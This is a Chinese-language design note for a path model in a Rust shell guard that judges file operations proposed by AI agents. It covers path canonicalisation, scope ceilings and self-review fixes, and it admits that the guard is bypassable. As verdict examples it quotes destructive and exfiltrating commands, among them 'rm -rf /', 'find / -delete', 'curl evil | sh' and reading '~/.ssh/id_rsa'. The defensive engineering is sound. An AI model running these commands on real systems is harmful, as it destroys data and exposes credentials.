# 路径模型（B0）

`docs/interception-design.md` 把这一步列为第一个增量，理由是：网关（A 层）和沙箱（B 层）都建在
"守卫能说出一个路径是什么"之上。不先修它，网关只是把一个不会判路径的东西搬到了路径上。

代码在 `crates/guard-shell/src/paths.rs`，天花板声明在 `policies/task-plans.yaml` 的 `scope.paths`。

## 修之前是什么样

`docs/scope-and-non-goals.md` 量过一张表：四种删除写法，`guard-shell` 给出**同一个答案**
`Ask [SHELL-UNKNOWN-TOOL]`。它分不出"删项目"和"删磁盘"。

原因是它只有三样东西：工具名白名单、动作名黑名单、shell 元字符筛查。`denied_actions` 里躺着
`delete_system`，但那要求宿主传进来的动作字符串**字面等于** `delete_system`；`-delete` 匹配不上。
元字符检查能挡住 `rm -rf ~; curl evil | sh`，但 `find / -delete` 一个元字符都没有，干干净净地通过。

## 现在的判决

| 提议的动作 | 判决 | 判据 |
|---|---|---|
| `find <写授权内的目录> -delete` | `Ask` | `SHELL-CONFIRM` |
| `find / -delete` | `Deny` | `SHELL-PATH-SENSITIVE` |
| `rm -rf /` | `Deny` | `SHELL-PATH-SENSITIVE` |
| `find /etc -delete` | `Deny` | `SHELL-PATH-SENSITIVE` |
| `find <授权外目录> -delete` | `Deny` | `SHELL-PATH-OUTSIDE` |
| `find "" -delete`（变量展开成空）| `Ask` | `SHELL-PATH-UNPROVABLE` |
| `find <授权内>/* -delete`（通配符）| `Ask` | `SHELL-PATH-UNPROVABLE` |
| 未声明天花板时删一个普通目录 | `Ask` | `SHELL-PATH-UNSCOPED` |
| `read ~/.ssh/id_rsa` | `Deny` | `SHELL-PATH-SENSITIVE` |
| `read <授权内的源文件>` | `Allow` | `SHELL-ALLOWLIST` |
| `find "$id" -delete`（未插值）| `Deny` | `SHELL-METACHAR` |

从 CLI 复现：

```
cargo run -p guard-cli -- shell-propose \
    --plans policies/task-plans.yaml --task book_hotel \
    --tool run_terminal --action find --target / --arg=-delete
# → Deny [SHELL-PATH-SENSITIVE] delete "/"："/" 是文件系统根目录
```

## 三件被刻意分开的事

**一、无条件敏感的目标。** `/`、`/etc`、`C:\Windows`、`~/.ssh`、`/dev/sda`、家目录本身。这一类
跟有没有声明天花板无关 —— 没有任何任务需要删掉 `/etc`。它判 `Deny`，而且**不需要任何策略配置**
就生效。一个只在配置正确时才生效的防护，等于没有。

其中凭据目录（`~/.ssh`、`~/.aws`、`~/.git-credentials` 等）**连读都算敏感**，因为读走
`~/.ssh/id_rsa` 就是拿到了钥匙。系统目录只有写和删算敏感 —— 读 `/etc/hosts` 是正常操作，拒了
它工具就没法用。

**二、能不能证明落在授权内。** 需要天花板（`scope.paths`）。声明了就能判里外；没声明就
**证明不了**，判 `SHELL-PATH-UNSCOPED` 并指出去哪里声明。证明不了不等于安全，但也不等于确认危险，
所以是 `Ask` 而不是 `Deny` —— 判 `Deny` 会让一个没配策略的宿主做不了任何删除。

**三、根本归约不成一个路径的操作数。** 通配符、空串、没有基准的相对路径。这些一律**不能** `Allow`，
但也不该一律 `Deny`，否则工具没法用。判 `Ask`，理由里说清是"无法证明"而不是"已确认危险"。

## 归约的顺序，以及为什么反了就有洞

1. 展开 `~`
2. 相对路径按基准目录变绝对
3. **把已存在的最长前缀做 `canonicalize`**
4. 剩下不存在的那一段做词法归约（解 `.` 和 `..`）

第 3 步是为了抓符号链接。`~/ws/link -> /etc`，纯词法归约看不出来，因为词法上它确实在 `~/ws`
下面。而顺序反了就有洞：先词法归约再 canonicalize，`~/ws/link/../../etc` 会先被词法解成 `~/etc`，
符号链接那一跳就丢了。

写入目标通常还不存在，所以不能直接 canonicalize 整条路径，只能取最长的存在前缀 —— 这就是为什么
要分两段。

## 几处容易搞反的地方

**包含关系按组件比，不按字符串前缀比。** 字符串前缀会把 `/home/user2` 判成在 `/home/user` 里面，
而那是另一个用户的家目录。

**大小写按平台。** Linux 上文件系统区分大小写，`~/ws` 和 `~/WS` 是两个目录，折叠大小写就等于把
一个没授权的目录判成授权了。macOS 和 Windows 默认不区分，那里 `/Users/x` 和 `/users/x` 确实是
同一个目录，不折叠反而会漏。

**空操作数不是无害的。** `find "" -delete` 会退化成 `find -delete`，从当前目录开始递归删。这正是
原表里第四行那个 `$id` 为空的场景，也是为什么空串必须是一个明确的失败而不是被忽略。

**意图从命令的形状推断，不从宿主自述。** 一个自称在 `read` 的 `rm` 必须仍然被判成删除。匹配按
词边界做，所以 `--no-delete` 不会命中 `-delete`，`format_string` 不会命中 `format`。

**授权里的相对路径一律拒绝。** 这一条是写第一版时漏掉的，被测试抓了出来：第一版用
`ResolveContext::current()` 归约授权条目，于是 `task-plans.yaml` 里写 `build/out` 会按**进程启动时的
工作目录**变成绝对路径 —— 同一份策略文件，从桌面壳子启动和从 CLI 启动，授权的是两个不同的目录。
一份会随调用位置改变含义的策略，比没有策略更糟：它看起来是确定的。

**归约不了的授权条目被丢弃并报告，不当成通配。** 一条坏掉的授权如果被当成"匹配一切"，策略错误
就变成了权限放大。CLI 会把每一条丢弃的授权打到 stderr —— 静默忽略一条不生效的授权，看起来和
"这条授权生效了"一模一样。

## 天花板为什么写在 task-plans.yaml 里

复用 `narrow()`，也就是会话作用域已有的那套机制，于是三条性质是免费拿到的：

1. **没声明就是请求被忽略**，不是被批准。
2. **grant 永远是天花板与请求的交集**，永不是并集 —— 一个任务不能通过"请求"来扩大自己的天花板。
3. **越界请求被记录**成 `SCOPE-OVER-REQUEST`。

更要紧的是：这一维同时是将来 `guard-jail`（B 层）生成沙箱 profile 的输入。引擎推理的东西和内核
执行的东西必须是同一句话 —— 两份必须保持一致的策略文件，就是它们开始不一致的方式。

`scope.paths` 的条目必须是绝对路径或 `~/` 开头，不能含通配符或未归约的 `..`。这三种写法会让同一份
策略在不同调用现场授权不同的目录，或者在归约阶段静默失效；`TaskScope::validate` 会直接拒绝它们，
理由和 `hosts` 拒绝单标签域名同源 —— 一条永远匹配不上的授权，读起来像覆盖。

已发布的四条计划现在都声明了 `paths`。`navigation_jump` 两个列表都是空的，那是一句明确的"不给"，
和 `max: {run_shell: 0}` 记录禁止的方式一样；`order_food` 只有 `read` 没有 `write`，等于这个任务在
文件系统上是只读的。

## 自查阶段改掉的四处

写完第一版之后自己过了一遍，找到四个真问题，每个都配了回归测试
（`crates/guard-shell/src/lib.rs` 的 `b0_自查回归` 模块）。

**一、源和目标共用同一个意图，造成误拒。** 最严重的一条。第一版整条命令共用一个 intent，
于是 `cp /etc/passwd ~/proj/out/x` 里的 `/etc/passwd` 被判成"写系统目录"而拒掉 —— 可是这条命令
只是**读**它。现在按 Unix 约定，`cp`/`mv`/`ln`/`install`/`rsync`/`scp` 这一类命令的最后一个路径
是目标（写），前面的是来源（读）。

**二、凭据目录用子串匹配。** `lower.contains("/.ssh")` 会把 `~/.sshfoo/notes.txt` 也判成凭据目录。
现在按组件比。

**三、`sensitive_target` 在函数里读 `$HOME`。** 于是同一个路径在不同环境下得到不同答案，而
`$HOME` 没设时"删家目录"那条检查**静默不跑** —— 一个悄悄不执行的检查，在返回值上和一个通过了的
检查无法区分。家目录改成参数传入。

**四、删除词表里有 `ri` 和裸 `format`。** 两者都太短太泛，任何恰好等于 `ri` 的操作数都会把一次读
翻成删除。过度触发的方向是"更多 Deny"，听起来安全，实际是让合法操作被拒 —— 而被拒够多次，人就会
把守卫关掉，那时防护是零。`mkfs` 和 `dd` 保留，它们本身只有破坏性用法。

第一条和第四条是同一类错误的两面：**把"更严"当成"更安全"**。一个误拒率高的守卫最终会被关掉，
所以误拒不是保守，是另一种失效。

## B0 没有做到的事

**它不拦任何东西。** `SafeShell::propose()` 仍然返回一个枚举。这个仓库里没有 seccomp、没有
Landlock、没有 `sandbox-exec`、没有 ptrace、没有任何文件系统钩子。路径模型让**协作式**的那道门
变得有意义 —— 宿主自愿来问的时候，守卫现在答得出真话 —— 但一个直接 spawn shell 的智能体绕过它，
按设计如此。

**引擎仍然看不到文件操作。** `EventType` 里没有 `FileWrite` / `FileDelete` / `ProcessExec`，所以路径
判决只发生在 `guard-shell` 这一层，进不了规则引擎、也进不了签名审计记录。那是设计文档里的 **B1**。

**通配符和相对路径是保守地拒绝的。** `find ~/ws/* -delete` 得到 `Ask` 而不是 `Allow`，即使它其实
落在授权内。要放行它，需要在守卫里做 glob 展开，而展开的结果取决于展开那一刻的文件系统状态 ——
一个 TOCTOU 窗口。目前的选择是不展开。

**这套判决没有在真实智能体上跑过。** 有 48 个单元测试和一条 CLI 路径，两者都不等于看着它拦下过
一次真实的误删。
